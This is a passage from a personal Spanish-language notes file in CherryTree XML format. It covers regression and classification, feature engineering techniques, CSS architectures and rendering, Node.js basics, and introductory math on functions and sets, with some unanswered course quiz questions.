      <node name="regresion y clasificacion" unique_id="186" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1697508639" ts_lastsave="1698189800">
        <rich_text>Regresion Lineal
- de aprendizaje supervisado, datos etiquetados
- basado en modelos, funcion hipotesis de funcion lineal
- es un modelo lineal
- computa suma ponderada de las caracteristicas de entrada y sumando una variable llamada bias
- predice valores continuos
- linea que se ajusta a los datos que se dieron, es llamada funcion hipotesis
- x variables de entrada (features), y variables de salida (target value), (x, y) ejemplo de entrenamiento (dataset)
- h_theta(x) = theta_0 + theta(_1)x, es igual a la funcion de la recta, y = mx + n, 
- theta cero dice donde cortara en las “y” y theta uno es la inclinacion
- construccion del modelo, es buscar los parametros que generen la funcion hipotesis que mejor se adapte al conjunto de datos
- se minimiza una funcion de coste (j_theta) para obtener los parametros optimos
- funcion de coste, estas pueden variar, se pueden aplicar varias a los modelos
- en regresion lineal generalmente se aplica MSE (mean squared error)
- funcion de optimizacion, gradiente descendiente
- esta muy ligada a la funcion de coste del algoritmo
- se busca una funcion convexa, donde hay un minimo global... derivadas
- se debe de buscar el minimo global de la funcion

Regresion Logistica
- predice un valor discreto, una clasificacion
- supervisado, basado en modelos, modelo lineal generalizado
- suma ponderada de las caracteristicas de entrada y sumando variable BIAS, se le aplica una funcion logistica
- predice valores discretos
- funcion hipotesis
- se usa la funcion sigmoide g(z) = (1) / (1 + e^-z), donde z es la funcion lineal
- problema de clasificacion binaria, aqui debe de encontrarse entre 0 y 1
- se maneja por la probabilidad de que algo ocurra
- se usa un threshold para decir si es cierto o falso
- funcion de coste
   → no se usa la misma que la de la regresion lineal
   → se toma un grupo de los etiquetados como 1, se inicializa theta 0 y 1 de forma aleatoria y se crea una prediccion hasta encontrar el valor que se desea, se hace lo mismo con los valores de 1
- funcion de optimizacion
   → se usa la misma para la regresion lineal, gradiente descendiente</rich_text>
      </node>
      <node name="Creacion de proyectos" unique_id="190" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1698801932" ts_lastsave="1700699378">
        <rich_text>el conjunto de datos es una parte esencial en la resolucion de un problema, al nivel del algoritmo a usarse
disponer de una cantidad suficiente de datos
esencial utilizar un conjunto de datos que es representativo del problema practico
los datos deben ser de calidad
debe seleccionarse un conjunto de caracteristicas adecuado, minimizando el numero de caracteristicas irrelevantes

las correlaciones ayudan para saber que la variable que modifica la salida pueden tomarse para usar con el modelo, es significativo
correlacion entre diferentes caracteriscas que e comportan igual, se pueden eliminar, ya que representan practicamente lo mismo

evitar overfitting y underfitting
separacion por subconjuntos, entrenar, validar y probar
overfitting, se ajusta demasiado bien al conjunto de datos de entrenamiento, aumentando el conjunto de datos si es posible, reduccion del numero de caracteristicas, utilizar algoritmos para la seleccion y extraccion de caracteristicas, regularizar
underfitting, cuando los datos fallan mucho, para resolver este se debe seleccionar otro tipo de modelo mas complejo y con mas flexibilidad

evaluacion de la hipotesis
se requiere de una forma de evaluar la funcion hipotesis
una o dos caracteristicas se puede representar graficamente
pero con mas caracteristicas
para evitar overfitting se usa un dataset que es de test el cual no conoce el modelo

seleccion del modelo

Preparacion del conjunto de datos
- valores perdidos, el dataset puede tener valores perdidos en una determinada caracteristica
   → se pueden eliminar el ejemplo del conjunto de datos
   → eliminar la caracteristica
   → asignar un valor determinado
- valores categoricos, representaciones de texto, estos deben de cambiarse a valores numericos
   → lo mas comun es usar encoding
- escalado y estandarizado de caracteristicas
   → diferentes escalas o valores muy impares
   → escalar es usar valores entre 0 y 1
   → se calcula restando el valor minimo y dividiendo por el maximo menos el minimo
   → en la estandarizacion se busca tener una media de cero y una desviacion estandar de uno
- desequilibrio de datos
   → datos con pocos datos positivos y muchos negativos
   → hacer oversample
   → seleccionar un subconjunto
   → modificar la funcion de error, para que la minoria tenga mas influencia en el modelo

Caso practico
- estimators: cualquier objeto que puede estimar algun parametro
   → se hace mediante el metodo fir, siempre toma un dataset como argumento
   → cualquier otro parametro e un hiperparametro
- Transformers: son estimadores que pueden transformar un conjunto de datos
   → se realiza mediante el metodo transform
   → reciben un dataset
- predictors: estimadores capaces de hacer predicciones
   → se realiza mediente el metodo predict
   → reciben un dataset
   → retornan un dataset o un array de numpy
   → tienen un metodo score para evaluar la prediccion
- Pipelines y transformadores
   → transformador personalizado: requiere el init, fit y transform, depende de BaseEstimator y TransformerMixin
   → Pipelines, permite ejecutar un flujo de ejecucion para la transformacion de datos, se usa por fit o fit_transform, recibe un nombre estimador, todos menos el ultimo deben de ser estimadores

Evaluacion de resultados:
- numericas:
   → precision
   → exhaustividad, recall
   → exactitud
- graficas
   → ROC, la esquina superior izquierda de la grafica es el punto ideal, `y` verdaderos positivos, `x` falsos positivos
   → PR (precision-recall), la esquina supperior izquierda de la grafica es el punto ideal
- matriz de confusion
   → se crean las metricas, verdadero positivo, verdadero negativo, falso positivo y falso negativo

Evaluacion de resultados
- separacion en subconjuntos, entrenamiento, validacion y pruebas</rich_text>
      </node>
    </node>
    <node name="data eng zoomcamp" unique_id="135" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1674689635" ts_lastsave="1675719767">
      <rich_text>--iidfile string
3
20530
2019-01-15
2: 1282 ; 3: 254
Long Island City/Queens Plaza

---
447,770
</rich_text>
      <rich_text family="monospace">0 5 1 * *</rich_text>
    </node>
    <node name="ingenieria de variables" unique_id="185" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="41" is_bold="0" foreground="" ts_creation="1697502469" ts_lastsave="1701922274">
      <rich_text># Tipos de variables
- cualquier caracteristica, numero o cantidad que puede ser medida o contada
- se pueden clasificar en dos:
   → Numericas
      ⇒ discretas
      ⇒ continuas
   → Categoricas
      ⇒ nominales
      ⇒ ordinales
      ⇒ fecha/hora
- Variables numericas
   → variables que son numeros
   → numeros enteros son variables discretas
   → cualquier valor en un rango, son variables continuas
- variables categoricas
   → tambien conocidas como etiquetas
   → pueden o no tener un orden logico
   → pueden ser cadenas o numeros
   → ordinal
      ⇒ categoricas que representan una catagoria o grupo con alguna clasificacion intrinseca, toma una escala preestablecida que tiene sentido
   → nominal
      ⇒ valores representan catagorias que no obedecen a una clasificacion u orden logico
- variables de fecha y hora
   → uso de fechas, horas o fechas y horas
- variables mixtas
   → numeros y categorias entre sus valores

Caracteristicas de las variables
- datos faltantes
   → datos ausentes o valores vacios, no estan disponibles para observaciones de variables
   → son un problema en la mayoria de las fuentes de datos
   → tienen un gran impacto en las conclusiones
   → razones por incompletos:
      ⇒ no se guardo apropiadamente
      ⇒ se divide entre 0
      ⇒ no estan disponibles o no se identifican
   → impacto:
      ⇒ incompatibles con sklearn
      ⇒ la sustitucion puede distorcionar la distribucion de la variable
      ⇒ afecta a todos los modelos de ML
   → mecanismos:
      ⇒ MCAR, completamente aleatorios, la probabilidad de que un valor falta es la misma para todas las relaciones, no hay relacion entre este y otro valor, omitir los valores no sesga ninguna inferencia o conclusiones hechas
      ⇒ MNAR, faltantes no aleatorios, mecanismo o razon por la cual los valores son introducidos en los datos, es algo externo lo que los afecta
      ⇒ MAR, faltantes aleatorios, la probabilidad de ocurrencia de los datos depende la informacion disponible
- cardinalidad
   → variables categoricas, estas etiquetas se conocen como cardinalidad
   → si numero de etiquetas es alto tiene alta cardinalidad
   → efectos:
      ⇒ strings incompatibles con SKLearn
      ⇒ distribucion desigual entre sets de training y test
      ⇒ sobre ajustes en algoritmos basados en arboles
      ⇒ probelmas operacionales
   → variables con muchas etiquetes tienden a dominar algunas con menos
   → muchas etiquetas puede introducir mucho ruido y poca informacion
   → reduccion de cardinalidad para mejorar el ML
   → problemas operacionales:
      ⇒ con etiquetas nuevas en el segmento de prueba, no se puede calcular estas nuevas, aqui lanza un error
- Categorias poco comunes
   → aparecen solo en una pequenia proporcion de los datos
   → se tiene las mismas consideracion que con las categorias de alta cardinalidad
   → se agrupan las categorias poco comunes para que no afecte tanto o eliminarlas
- distribuciones
   → funcion que describe como se espera que dicho suceso ocurra
   → la suma de las probabilidades debe ser 1
   → la probabilidad para un valor debe de estar entre 0 y 1
   → distribucion normal, la mas conocida, muchas observaciones la tiene, es simetrica, la probabilidad decrece en ambas colas
   → para una distribucion normal podemos aplicar la media para la imputacion
   → si es asimetrica, se debe usar la mediana
   → modelos lineales, normalmente distribuidas
   → otros modelos no imponen condiciones
   → una buena distribucion puede mejorar el desempenio
   → transformacion para mejorar la distribucion, apliicando transformacion matematicas o discretizando las variables (binning) agrupando los valores de las variables
- valores extremos
   → outlier, significativamente diferente al resto de los datos
   → son completamente diferentes
   → dependen del contexto pueden tratarse o ignorarse
   → los outliers salen del alcance del curso
   → los que mas afectan son las regresiones lineales
   → adaboost es otro modelo que le afecta
- magnitud o escala de las variables
   → en los modelos lineales esto influye en los modelos, variables con rango mayor de valores tienden a dominar
   → descenso de gradiente, converge mas rapido
   → svm, encuentr mas rapido los vectores de soporte
   → medidas de distancia, son sensibles a la escala
   → afectan mas a los que son en distancia
   → afectan menos a los que tienen que ver con arboles

Datos faltantes
- tratamiento de casos completos, eliminacion por lista
   → descartar todas las observaciones donde faltan alguno de los datos
   → solamente se invluyen los asos que tienen observaciones completas
   → MCAR, solo de falta aleatoria
   → facil de implementar
   → no requiere manipulacion de datos
   → mantiene distribucion de variables
   → excluye gran proporcion de los datos
   → observaciones importantes son eliminadas
   → genera un sesgo si los datos no son representativos
   → modelos no podran predecir cuando esten los datos faltantes 
   → solo si el 5% de los datos contiene observaciones incompletas
- sustitucion de datos faltantes por la media o mediana
   → se usa la media si la variable esta normalmente distribuida o la mediana si la variable tiene una distribucion sesgada
   → se puede usar con variables numericas
   → se usan con datos faltantes de forma aleatoria
   → el valor original sea el que muestran la mayoria de las observaciones
   → facil de implementar
   → forma rapida de obtener conjuntos completos de datos
   → puede ser integrado en produccion
   → distorcion de la distorcion original
   → distocion de la varianza y covarianza con las otras variables
   → solo el 5% tiene datos faltantes
- imputacion con valor arbitrario
   → consiste en reemplazar todas las ocurrencias por un valor cualquiera
   → tipicamente se usan 0, 999, -999, combinaciones de 9 o -1 (si la distribucion es positiva)
   → categoricas o numericas, aunque gteneralmente es usada en categoricas
   → el valor no debe coincidir con la media o mediana
   → datos no faltan de forma aleatoria
   → queremos marcar que el dato faltante es distinto
   → facil de implementar
   → forma rapida de obtener conjuntos completos
   → puede ser integrado en produccion
   → captura la importancia de la ausencia
   → distorciona la distribucion original
   → distorciona la varianza
   → distorciona la covarianza con las otras variables
   → este puede generar valores extremos
   → el valor debe de ser escogido cuidadosamente, no moda, mediana o moda
- imputacion al borde de la distribucion
   → equivalente a la sustitucion por valores arbitrarios, automaticamente por uno al final de la distribucion de la variable
   → si la variable esta normalmente distribuida se usa el promedio mas o menos 3 veces la desviacion estandar
   → si es asimetrica, su usa la regla de proximidad entre-cuartil
   → aprende valores de los datos
   → necesitamos dividir el dataset en entrenamiento y prueba
- imputacion por categoria mas frecuente o moda
   → reemplaza todas las ocurrencias usando la moda
   → se puede usar con variables categoricas o numericas
   → es mas usado por variables categoricas
   → valores faltan de manera aleatoria
   → la mayoria de observacion son parecidas
   → facil de implementar
   → puede ser integrada en produccion
   → distorciona la relacion entre variables
   → lleva a la sobrerepresentacion
   → se usa con MCAR
   → los datos faltantes son del 5%
- Sustitucion usando etiqueta missing
   → valores faltantes toman categoria faltantes
   → metodo mas usado para variables categorias
   → facil de implementar
   → puede ser integrado en prod
   → captura la ausencia
   → no asume los datos faltantes
   → si NA es bajo, crear una vategoria adicional produce sobre ajusteen los arboloes de decision
- sustitucion por muestras aleatorias
   → para variables numericas y categoricas
   → tomar observaciones aleatorias en donde existen y usar esos valores para los faltantes
   → uso cuando es MCAR
   → reemplazar una poblacion con datos con la misma distribucion
   → facil de implementar
   → puede ser integrado en produccion
   → preserva la varianza de la variable
   → aleatoriedad
   → se pueden traer valores valores distintos en cada ronda de prediccion
   → puede distorcionar las relaciones entre variables
   → consume mucha memoria en produccion
   → se debe fijar una semilla para que la imputacion no sea variable
- idicador binario de datos faltantes
   → binaria adicional que se agrega para datos faltantes
   → variables numericas y categoricas
   → se agrega en una columna de mas
   → el reemplazo se puede hacer con otras tecnicas
   → datos no faltan de manera aleatoria
   → genera variable adicionales
   → la variable original todavia tiene que ser sustituida
   → muchos indicadores terminan siendo identicos o altamente correlacionados
   → se usan mucho en competencias de data
- SimpleImputer
   → transformador de la libreria scikit learn
   → permite usar gridsearch
   → se pueden usar diferentes valores
   → limitaciones
      ⇒ retorna un arrray en lugar de un dataframe
      ⇒ necesita clases adicionales para seleccionar cuales variables sustituir
      ⇒ no es tan sencillo de usar
   → se usa columntransformer
   → para reemplazo valor arbitrario se usa strategy='constant', fill_value={valor}

Feature engine - lib
- incluye todas las tecnicas de imputacion
- funcion como sklearn
- permite implementar en un grupo selecto de variables
- puede ser integrado con los Pipelines de sklearn

Codificacion de variables categoricas
- proceso de reemplazar etiquetas por una representacion numerica
- producir varibles para ML
- construir variables predictivas
- relacion monotonica
   → cuando la variable incrementa, incrementa el valor del target
   → cuando la variable incrementa, el valor del target decrece
   → mejoran el desenpeno en modelos lineales, tambien en arboles de decision
   → se prefiera incluir restricciones monotonicas
   → para las etiquetas raras se usa one hot para categorias mas fecuentes y agrupacion de las poco frecuentes
- codificacion one hot:
   → cada categoria es reemplazada con una varible binaria tambien llamada dummy
   → la variable toma el valor 1 o 0, si la categoria esta presente
   → tambien puede hacerse con k - 1 variables
   → con binarias se usa una variable binaria
   → ayuda a reducir por una dimension con k-1
   → a veces es mejor usar k variables, por ejemplo con arboles, seleccion de variables de forma recursiva, cuando se quiere saber la importancia de cada una de las categorias de los datos
   → ventajas
      ⇒ no asume o impone condiciones en la distribucion de la variable o de las categorias
      ⇒ mantiene toda la informacion
      ⇒ es apropiada para modelos lineales
   → limitaciones
      ⇒ incrementa el dataset
      ⇒ no añade informacion adicional
      ⇒ muchas variables dummy pueden ser identicas
- codificacion de categorias mas frecuentes
   → crear dummies pra cateorias mas frecuentes
   → ventajas
      ⇒ facil de implementar
      ⇒ no requiere horas en la exploracion
      ⇒ no genera numero extremadamente alto de nuevas variables
      ⇒ adecuado para modelos lineales
   → limitaciones
      ⇒ genera nuevas variables
      ⇒ no retiene informacion adicional de las etiquetas ignoradas
      ⇒ se hace un count group by oreder by limit para obtener los datos... en lenguaje SQL
- Codificacion ordinal
   → reemplazo de una categotia por digitos o numeros enteros del 1 a n o de 0 a n - 1
   → los numeros se asignan arbitrareamente
   → permite rapuda evaluacion comparativa en los modelos de ML
   → facil de implementar
   → no genera ams variables
   → puede funcionar con arboles de decision
   → no anade orden arbitrario
   → no es bueno para modelos lineales
   → no maneja nuevas categorias
- codificacion con frecuencias o cuentas
   → se reemplaza por el numero o porcentaje de observaciones
   → captura la representacion de cada etiqueta
   → metodo popular en kaggle
   → supuesto: el numero de observaciones de cada categoria predice el valor del target o vaiable objetivo
   → facil de implementar
   → no genera variables
   → funciona bien con arboles
   → no sirve para modelos lineales
   → no maneja categorias adicionales
   → si dos categorias aparecen iguales en cantidad se puede perder informacion
- Codificacion guiada por la variable objetivo
   → guiadas por la variable objetivo
   → crean relacion monotica entre variable y target
   → ordena las categorias de acuerdo al targetr
   → numero de 1 a k, k es el numero de vategorias distintas en la variable
   → enumeracion guiada por el valor promedio del target
   → facil de implementar
   → no genera multiples variables
   → crea una relacion monotonica entre las vategorias y el target
   → puede causar sobreajustes
   → dificil de implementar con validacion cruzada
- Codificacion con la media del target
   → se reemplaza la categoria con el valor medio del target
   → facil de implementar
   → no genera multiples variables
   → crea una relacion monotonica
   → puede causar sobreajustes
   → dificil de implmentar con vlidacion cruzada
   → si 2 tienen el mismo promedio del target se pierde informacion
- Codificacion con proporcion de probabilidades
   → proporcion de la probabilidad de que el target sea 1 o 0, este solo usa cuando es binario
- Peso de la evidencia
   → evaluacion de datos o informacion
   → evaluacion de incumplimientos de pago de prestamos p deudas
- Codificacion de categorias raras, poco comunes
   → estas generalmente se usa la etiqueta rare
   → estas aparecen pocas veces, asi que aportan muy poca informacion para el modelo
   → variables con una categoria predominante, renombrar la etiqueta con pocos valores como rara
   → variables con pocas categorias, se pueden agrupar las bajas en una sola categoria
   → variables con alta cardinalidad, se recomienda tambien agrupar en una misma etiqueta para reducir tantas etiquetas
- codificacion binaria y hashing de variables
   → uso de 1 y 0 para el significado de la variable
   → hashing, transforma las variables en vector binario, se usa para alta cardinalidad, se crea un indice de donde estara el vector binario

Transformacion de variables
- lineales asumen que la variable tiene una distribucion gaussiana, normalidad puede ser evaluada con un histograma y graficos Q-Q
- transformacion de variables:
   → logaritmica. solo valores positivos
   → exponencial, se eleva la variable a una variable o raiz cubica o cuadrada, no definida para todo x
   → reciproca, no esta definida para 0 -&gt; 1/x
   → box-cox, se usan ds formulas dependiendo si el exponente es diferente de 0, sino es usado el logaritmo natural
   → yeo-johnson, mas compleja, uso de varias funciones dependiendo de lamba y el valor de la variable

Discretizacion de variables
- transformacion de una variable numerica continua a una discreta, se crean intervalos conocidos conocidos como segmentos, bin o buckets
- se usa para sesgos donde se mejora la distribucion
- ayuda a manejar los outliers
- sin supervision
   → igual rango
      ⇒ se dividen en n segmentos de n tamaño
      ⇒ se determinan por el (valor maximo - minimo) / segmentos
      ⇒ no mejor distribucion
      ⇒ maneja valores extremos
      ⇒ crea variables discretas
      ⇒ se puede combinar con codificacion categorica
   → igual frecuencia
      ⇒ el rango de los posibles valores de una variable se divide en N segmentos y cada segmento tiene el mismo numero de obsrevaciones
      ⇒ los limites corresponden a los cuantiles
      ⇒ se distribuye mas homogeneamente
      ⇒ se mejora la distribucion
      ⇒ maneja valores extremos
      ⇒ crea variables discretas
      ⇒ se combiona con codificaicon categorica
   → k medias
      ⇒ se usa la agrupacion de k-medias
      ⇒ busqueda de centroides
      ⇒ se crean los grupos agregando los datos mas cercanos a los centroides
      ⇒ los limites se llaman bin limits
      ⇒ no cambia la distribucion de las variables
      ⇒ maneja valores extremos, pueden influir en los centroides
      ⇒ crea variables discretas
      ⇒ se puede combinar con codificacion categorica
- supervisados
   → arboles de decision
      ⇒ metodo supervisado, se usan los valores del target
      ⇒ por medio de arboles de descision
      ⇒ no mejora la distribucion de los valores
      ⇒ maneja valores extremos
      ⇒ crea variables discretas
      ⇒ crea relacion monotonica
      ⇒ si en dado caso no se ve la relacion monotomica se debe de optimizar el algoritmo
- discretizacion mas codificacion de variables
   → la codificacion ayuda a que por medio de una ordenacion se tenga una relacion homogenea
   → ayuda mucho  a modelos lineales
- discretizacion basada en conocimiento
   → se fijan los valores conociendolos, esto es gracias a expertos de negocio

Tratamiento de valores extremos
- valor significamente diferente del resto de los datos
- afectan modelos lineales y ada boost
- que se puede hacer
   → remocion, eliminar los valores, procedimiento rapido, puede remover una larga parte de los datos
   → datos ausentes, como si fueran datos ausentes
   → discretizacion, colocarlos en segmentos extremos
   → truncamiento, limitar la distribucion de la variable a unos maximos o monimos, Top/bottom, los datos no se mueven, distorciona la distribucion de la variable
- como detectar
   → por medio de la distribucion gaussiana (media y std)
   → regla del rango inter-cuartil
   → cuantiles

Poniendo las variables en la misma escala
- afecta directamente los coeficientes de regresion
- las variables con mayor rango de valores dominan sobre aquellas de menor rango
- descenso por gradiente convergera mucho mas rapido si todas las variabes tienen rangos similares
- puede ayudar a reducir el tiempo para encontrar los vectores de soporte en SVM
- los algoritmos que usan medidas de distancias son mas sensibles a la escala de las variables
- algoritmos suceptibles
   → casi todos
   → regresion linea y logistica
   → redes neuronales
   → maquinas de vectores de soporte
   → KNN
   → agrupamiento por k medias
   → analisis discriminante lineal
   → analisis de componente principales
- no afectados
   → arboles de regresion y clasificacion
   → bosques aleatorios
   → arboles gradiente de potenciacion
- escalamiento es normalizar los rangos de valores dentro de una escala similar
- este es el ultimo paso en el pipeline
- Escalado estandar
   → los datos quedan centrados alrededor de zero y su varianza es igual a 1
   → los valores quedan con negativos
   → el valor que obtenemos nos dice que tan lejos o cerca esta la observacion con respecto a la media
   → centraliza la media alrededor de 0
   → escala la varianza de la variable a la unidad
   → preserva la forma original de la distribucion
   → los valores maximos y minimos de la variable varian
   → preserva los valores extremos
- Normalizacion con la media
   → centrar los valores de la variables alrededor de 0 y reescalar el rango de valores
   → aqui se usa el rango de valores para obtener estos valores
   → generalmente estan entre 1 y -1
   → centraliza la media alredeedor de 0
   → la varianza es diferente
   → puede alterar la forma de la distribucion
   → los valores maximos y minimos se restringen entre -1 y 1
   → preserva los valores extremos
   → en scikit learn se usa: StandardScaler y RobustScaler
- Escalamiento de valores por maximos y minimos
   → escala los valores entre 0 y 1
   → la media y la varianza son diferentes
   → puede cambiar la forma de la distribucion
   → los alores quedan entre 0 y 1
   → preserva los valores extremos
- </rich_text>
    </node>
  </node>
  <node name="JS" unique_id="26" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1625688385" ts_lastsave="1630594410">
    <node name="fontend-dev" unique_id="27" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1625688395" ts_lastsave="1626215724">
      <rich_text>- html, es un lenguaje de marcado, estructura el sitio web
- css, permita crear un diseño agradable

# renderizado:
- DOM
   → document object model
   → se transforman las etiquetas a objetos que entiende el navegador
- CSSOM
   → es casi lo mismo que el DOM, solo que es para CSS
- RenderTree
   → es el arbol que uno al dom y al cssom
   → los pasa:
      ⇒ Bytes
      ⇒ characteres
      ⇒ tokens
      ⇒ nodes
      ⇒ dom
   → se crea primero el arbol y luego se le asigna el css que le corresponde
- el navegador hace:
   → procesa html y construlle el dom
   → procesa el css y construye el cssom
   → dom + cssom = render tree
   → ejecuta el diseño en el render tree
   → pinta el nodo en la pantalla

# HTML
- la etiqueta i es para italica mientras que em enfatiza

# CSS
- con nth-child -&gt; se agrega 2n para los parrafos pares
- con el resolutor de ambito (::) se usan los pseudoelementos (first-letter para jugar con elementos de P)
- Valores relativos y absolutos
   → absolutas, cm, in, mm, px, pt, pc
   → no se fijan en la medida de algo más
   → relativas: relativas a otra unidad de medida u otro elemento
      ⇒ vmax, em...
- Arquitecturas:
   → deben ser:
      ⇒ predecibles
      ⇒ reutilizables
      ⇒ mantenible
      ⇒ escalable
   → buenas practicas:
      ⇒ establecer reglas
      ⇒ explicar la estructura base
      ⇒ establecer estandares de codificacion
      ⇒ evitar largas hojas de estilo
      ⇒ documentación
   → OOCSS
      ⇒ orientado a objetos
      ⇒ diseño separado del contenido
   → BEM
      ⇒ block element modify
      ⇒ separa los bloques, elementos y modificadores
      ⇒ se usa “__” para agregar el nuevo elemento de clase y “--” para agregar el elemento modificador
   → SMACSS
      ⇒ arquitectura de CSS escalable y modular
      ⇒ se divide en
         • base: componentes que se usan en toda la applicacion como botones
         • layout: elementos que solo se usan en la pagina una vez
         • module: componentes que se usan en la app mas de una vez
         • state: cambios que se ven en ciertos elementos
         • theme: cuando halla cambios en temas sea facil hacer esos cambios
   → ITCSS
      ⇒ Triangulo invertido de CSS
      ⇒ se dividen los archivos de CSS en ciertas partes:
         • ajustes
         • herramientas
         • genericos
         • elementos
         • objetos
         • componentes
         • utilidades
   → Atomic Desing
      ⇒ atomos: elementos mas chicos
      ⇒ moleculas: conjuntos de atomos
      ⇒ organismos
      ⇒ templates
      ⇒ paginas

# Construcción de componentes
- es un elemento muy pequeño que sirve para construir componentes mas grandes en un futuro
- se deben de identificar para ver donde se pueden volver a utilizar
- strorybooks -&gt; npm

# Flexbox
- sirve para ayudar en la parte de la alineacion
- se tiene un contenedor con sus items:
   → container maneja el display
   → flex-direction para manejar hacia donde queremos que vallan los elementos
   → se le puede colocar orders
- CSS grid
   → nos ayuda a manejar todo el layout
   → maquetación y diseño responsivo
   → display en grid
   → se pueden por porcentaje cuantas columnas y filas
- media queries:
   → se pueden ajustar diseños a dispositivos mas pequeños

# Preprocesadores
- sass:
   → manejo de variables, se definen con $
   → anidamiento, se puede tener una clase que tenga varios elementos
   → herencia, se usa con @extend {nombre de la clase}
   → mixin, reutilización de codigo, se hace para cuando se tienen propiedades que se repiten varias veces y se usa @include

# Accesibilidad:
- manejo de buena semantica
- uso de lectores de pantalla
- voiceover
- ANDI
- todos los input deben tener una etiqueta label (aria-label)

Errores:
La etiqueta </rich_text>
      <rich_text family="monospace">&lt;em&gt;</rich_text>
      <rich_text> y la etiqueta </rich_text>
      <rich_text family="monospace">&lt;i&gt;</rich_text>
      <rich_text> hacen que el texto contenido en ellas sea itĂ¡lico, sin embargo, </rich_text>
      <rich_text family="monospace">&lt;em&gt;</rich_text>
      <rich_text> influye en:
Un pseudo-elemento se puede utilizar para:
Es la manera mediante la cual los navegadores deciden qué valores de una propiedad de CSS son más relevantes para un elemento:
La abreviaciÃ³n de grid-column-start: 2; y grid-column-end: 5; es:
Con flexbox (con el valor por defecto de flex-direction) para centrar un elemento de manera horizontal debo usar:
¿Cuál de los siguientes </rich_text>
      <rich_text weight="heavy">NO</rich_text>
      <rich_text> es un lector de pantalla?
</rich_text>
    </node>
    <node name="Curso practico JS" unique_id="28" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1626820687" ts_lastsave="1626820687"/>
    <node name="closures y scope" unique_id="29" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1628030397" ts_lastsave="1628030400">
      <rich_text>el scope es el alcance que tiene la variable dentro del codigo
- local
- global</rich_text>
    </node>
    <node name="node1" unique_id="30" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1630594410" ts_lastsave="1632930112">
      <rich_text>¿Cuál es el comando para listar los paquetes y módulos instalados?
npm list -g --depth 0
¿Cuál es el comando que nos permite ver todo el output en la terminal/consola?
npm run build --dd
¿Cuál es el comando que nos permite ver una auditoría en formato json?
npm audit --json


# EventLoop
- bucle que se ejecta todo el tiempo
- todo funciona de forma asincrona
- se ejecuta aparte del eventloop
- se evian los eventos a traves del event queue
- thread pool si no se puede ejecutar al momento... por ejemplo consultas a bases de datos
- cada thread pool levanta un hilo por cada peticion
- problemas de seguridad

Para leer un archivo de manera síncrona, mediante el módulo fs hacemos uso de
Para crear un servidor en Node.js es necesario ejecutar el método del módulo http:
Cuando hacemos tests para nuestros servicios lo importante es probar los llamados de las librerĂ­as u otros servicios.
La manera como creamos una consola personalizada es mediante la instanciaciĂ³n de:
¿Cuál es una característica de Express?
¿Cuál de los siguientes es un verbo HTTP?
Para retornar una respuesta con cache es necesario establecer el header:
La clase EventEmitter se obtiene del módulo:
Los métodos mas populares de un Readable stream son:
</rich_text>
    </node>
  </node>
  <node name="Juegos" unique_id="31" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1625265105" ts_lastsave="1625265105"/>
  <node name="Teoricos" unique_id="56" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1641243242" ts_lastsave="1641243251"/>
  <node name="Matematicas" unique_id="38" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1617840054" ts_lastsave="1667337877">
    <node name="funciones matematicas para DS e IA" unique_id="85" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1652028696" ts_lastsave="1666052420">
      <rich_text>Las matematicas son un lenguaje
las funciones nor permiten modelar nuestra realidad

que es una funcion?
- funciones de una sola variable, es por que depende de una sola cosa para que varie
- una funcion es copmo una maquina, donde entra un elemento x para que salgo una y
- es una regla donde cada elemento de un conjunto A se le asina un conjunto de B
- se puede representar:
   → verbalemente, habladito che
   → numericamente, generalmente una tabla de valores
   → visualmente, por medio de grafica, donde represente los valores
   → algebraicamente, la mas guapa, y = f(x) = x
- tipos de variables
   → variables cualitativas
      ⇒ nominales, se les asigna una cualidad, por ejemplo los colores
      ⇒ ordinales, representan un orden, como se puede acomodar un objeto
      ⇒ binarias, solo tomand dos valores, unos y ceros
   → variables cuantitativas
      ⇒ discretas, representan un numero de valores finitos, son puramente enteras, se separan por pasos
      ⇒ continuas sus valores pueden ser infinitos, toman valores dentro de los numero reales
- dominio y rango
   → que valores pueden tener las funciones?
      ⇒ dominio, son los valores que toma x-independiente
      ⇒ rango son los resultados que nos da una funcion
- simbolos: </rich_text>
      <rich_text link="webs https://laboratoriomatematicas.uniandes.edu.co/semarquitec/simbolosmat.htm">https://laboratoriomatematicas.uniandes.edu.co/semarquitec/simbolosmat.htm</rich_text>
      <rich_text>
- conjuntos:
   → de forma grafica y circular
   → el universo se representa con omega
   → union, todos los elementos de los conjuntos se unen, se representan con U
   → interseccion, son solo los elementos que se comparte: se representa con una U volteada
   → perteneces es como una E: a E A, la E es curveada
   → se tiene el conjunto vacio que se representa con una circulo con una linea enmedio o con {}
   → conjuntos de numeros
      ⇒ naturales, son todos los enteros sin incluir el cero, discreto
      ⇒ enteros, son todos los enteros negativos y positivos, tambien es discreto
      ⇒ racionales, incluyen decimales y fracciones, a/b pertenecen a los enteros, donde b es diferente de 0
      ⇒ Irracionales, todos aquellos numero que tienen una expansion de decimal que no sse pueden escribir as: a/b, por ejemplo pi, euler
